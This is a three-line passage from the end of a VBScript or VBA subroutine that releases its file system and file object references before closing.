	Set objFileSystem = Nothing
	Set objFile = Nothing
End Sub